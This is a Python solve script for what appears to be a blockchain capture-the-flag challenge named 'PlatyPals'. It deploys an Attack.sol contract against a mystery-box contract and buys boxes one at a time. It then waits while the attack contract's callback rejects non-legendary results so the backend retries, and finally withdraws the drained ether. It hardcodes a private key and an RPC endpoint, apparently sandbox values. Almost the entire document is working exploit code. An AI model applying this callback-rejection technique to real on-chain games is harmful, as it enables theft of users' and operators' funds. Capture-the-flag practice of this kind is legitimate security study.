#!/usr/bin/env python3

# add import
import os
import time
from pathlib import Path
from web3 import Web3
from solcx import compile_files
from solcx import install_solc

# add definition
Local_Ethereum_Endpoint = os.getenv('RPC', 'http://10.83.2.226:8545/634f526d-2803-4283-9ca9-984d687f7d9c')
Private_Key = os.getenv('PRIVATE_KEY', '0x98a21b09dd8a90c4f1eeb0eaf61c624f7b97a7aae16328cfa9237afc50dd66cd')
Setup_Address = os.getenv('SETUP_ADDRESS', '0x6BD46722677Ecc4D15d450E89283896EcA92f79E')
Solc_Version = '0.8.20'
Poll_Interval = 2
Max_Wait = 1200

w3 = Web3(Web3.HTTPProvider(Local_Ethereum_Endpoint, request_kwargs={'timeout': 30}))
account = w3.eth.account.from_key(Private_Key)
my_address = account.address

# contract ABI
setup_abi = [
    {'inputs': [], 'name': 'TARGET', 'outputs': [{'type': 'address'}], 'stateMutability': 'view', 'type': 'function'},
    {'inputs': [], 'name': 'isSolved', 'outputs': [{'type': 'bool'}], 'stateMutability': 'view', 'type': 'function'}
]

chal_abi = [
    {'inputs': [], 'name': 'nextUnopened', 'outputs': [{'type': 'uint256'}], 'stateMutability': 'view', 'type': 'function'},
    {'inputs': [], 'name': 'nextBoxId', 'outputs': [{'type': 'uint256'}], 'stateMutability': 'view', 'type': 'function'},
    {'inputs': [{'name': '', 'type': 'address'}, {'name': '', 'type': 'uint8'}], 'name': 'pals', 'outputs': [{'type': 'uint256'}], 'stateMutability': 'view', 'type': 'function'}
]

# send signed transaction
def send_transaction(tx):
    tx = dict(tx)
    tx['from'] = my_address
    tx['nonce'] = w3.eth.get_transaction_count(my_address, 'pending')
    tx['chainId'] = w3.eth.chain_id

    # use old transaction type to avoid gas fee error
    tx.pop('gasPrice', None)
    tx.pop('maxFeePerGas', None)
    tx.pop('maxPriorityFeePerGas', None)
    tx.pop('type', None)
    tx.pop('accessList', None)
    tx['gasPrice'] = w3.eth.gas_price

    if 'gas' not in tx:
        tx['gas'] = 1000000

    signed_tx = account.sign_transaction(tx)
    if hasattr(signed_tx, 'raw_transaction'):
        raw_tx = signed_tx.raw_transaction
    else:
        raw_tx = signed_tx.rawTransaction

    tx_hash = w3.eth.send_raw_transaction(raw_tx)
    print('TX:', tx_hash.hex())
    receipt = w3.eth.wait_for_transaction_receipt(tx_hash, timeout=120)
    if receipt.status != 1:
        raise RuntimeError('Transaction failed: ' + tx_hash.hex())
    print('Transaction success. Gas:', receipt.gasUsed)
    return receipt

# compile Attack.sol and deploy it
def deploy_attack(target_address):
    print('Compiling Attack.sol')
    install_solc(Solc_Version)
    source_file = Path(__file__).resolve().parent / 'Attack.sol'
    if not source_file.exists():
        raise FileNotFoundError('Attack.sol is required: ' + str(source_file))

    compiled = compile_files([str(source_file)], solc_version=Solc_Version, output_values=['abi', 'bin'])
    attack_data = None
    for contract_name in compiled:
        if contract_name.endswith(':Attack'):
            attack_data = compiled[contract_name]
            break
    if attack_data is None:
        raise RuntimeError('Attack contract was not found')

    factory = w3.eth.contract(abi=attack_data['abi'], bytecode=attack_data['bin'])
    tx = factory.constructor(target_address).build_transaction({'from': my_address, 'gas': 1500000})
    receipt = send_transaction(tx)
    attack = w3.eth.contract(address=receipt.contractAddress, abi=attack_data['abi'])
    print('Attack contract:', attack.address)
    return attack

# buy one box each time
def buy_box(attack):
    print('Buying mystery box')
    tx = attack.functions.buy().build_transaction({
        'from': my_address,
        'value': w3.to_wei(1, 'ether'),
        'gas': 300000
    })
    send_transaction(tx)
    print('Box purchased')

# backend retries when the callback rejects non-legendary results
def wait_for_legendary(attack, target, expected):
    print('Waiting for LEGENDARY', expected)
    start_time = time.monotonic()
    last_print = -10
    while True:
        count = attack.functions.legendaryCount().call()
        if count >= expected:
            print('LEGENDARY acquired:', count)
            return

        elapsed = time.monotonic() - start_time
        if elapsed > Max_Wait:
            raise TimeoutError('Waiting too long for legendary')

        if elapsed - last_print >= 10:
            last_print = elapsed
            next_box = target.functions.nextBoxId().call()
            unopened = target.functions.nextUnopened().call()
            print('Elapsed:', int(elapsed), 'Pending:', next_box - unopened, 'Legendary:', count)
        time.sleep(Poll_Interval)

# get money from attack contract
def withdraw(attack):
    balance = w3.eth.get_balance(attack.address)
    print('Attack balance:', w3.from_wei(balance, 'ether'), 'ETH')
    if balance == 0:
        return
    tx = attack.functions.withdraw().build_transaction({'from': my_address, 'gas': 200000})
    send_transaction(tx)
    print('Withdraw success')

# main program
def main():
    if not w3.is_connected():
        raise ConnectionError('Cannot connect to RPC')
    print('Chain ID:', w3.eth.chain_id)
    print('Player:', my_address)
    print('Player balance:', w3.from_wei(w3.eth.get_balance(my_address), 'ether'), 'ETH')

    setup = w3.eth.contract(address=Web3.to_checksum_address(Setup_Address), abi=setup_abi)
    target_address = setup.functions.TARGET().call()
    target = w3.eth.contract(address=target_address, abi=chal_abi)
    print('Target:', target_address)
    print('Target balance:', w3.from_wei(w3.eth.get_balance(target_address), 'ether'), 'ETH')

    if setup.functions.isSolved().call():
        print('Already solved')
        return

    attack = deploy_attack(target_address)

    # get two legendary pals, one box at a time
    for stage in range(1, 3):
        print('STAGE', stage, '/ 2')
        buy_box(attack)
        wait_for_legendary(attack, target, stage)
        print('Target balance:', w3.from_wei(w3.eth.get_balance(target_address), 'ether'), 'ETH')
        print('Attack balance:', w3.from_wei(w3.eth.get_balance(attack.address), 'ether'), 'ETH')
        if setup.functions.isSolved().call():
            print('Challenge solved')
            break

    solved = setup.functions.isSolved().call()
    print('isSolved:', solved)
    print('Remaining target balance:', w3.from_wei(w3.eth.get_balance(target_address), 'ether'), 'ETH')
    print('Legendary count:', attack.functions.legendaryCount().call())
    if not solved:
        raise RuntimeError('Challenge not solved')

    withdraw(attack)
    print('PLATYPALS SOLVED')
    print('Attack:', attack.address)
    print('Use nc and select option 3')

if __name__ == '__main__':
    main()
